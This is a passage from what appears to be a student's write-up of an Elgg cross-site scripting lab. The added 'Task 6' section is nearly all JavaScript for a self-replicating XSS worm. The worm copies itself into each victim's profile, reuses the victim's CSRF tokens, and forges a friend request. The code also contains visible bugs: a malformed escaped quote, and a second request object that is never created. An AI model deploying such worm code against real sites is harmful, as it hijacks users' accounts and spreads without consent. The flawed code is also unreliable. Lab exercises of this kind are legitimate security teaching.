@@ -72,3 +72,45 @@ Okay, so I had to create the variable desc which is our description variable. Th
 You need this line of code because if you didn't have it, you would attack yourself. So this is basically saying that if the user id is not Samy's, then we continue with the attack, but if it is, we do not do anything. This was probably the hardest part for me to figure out for some reason because I couldn't figure out what Samy's GUID was for the life of me. 
 
 ## Task 6
+
+```js
+
+<script type="text/javascript" id="worm">
+window.onload = function(){
+
+var headerTag = "<script id=\ "worm\" type=\"text/javascript\">";
+var jsCode = document.getElementById("worm").innerHTML;
+var tailTag="</" + "script>";
+var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+var userName=elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+var accesslevel="&accesslevel[description]=2";
+var description="&description="+wormCode;
+var briefdescription="&briefdescription=Zoe was here again";
+
+var content=token +ts +userName + description + briefdescription+accesslevel+guid;
+var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST",sendurl,true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Content-Type",
+	"application/x-www-form-urlencoded");
+Ajax.send(content);
+
+var Ajax2=null;
+var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=59"+ts+token;
+Ajax=new XMLHttpRequest();
+Ajax2.open("GET",sendurl,true);
+Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax2.setRequestHeader("Content-Type",
+	"application/x-www-form-urlencoded");
+Ajax2.send();
+}
+</script>
+
+```
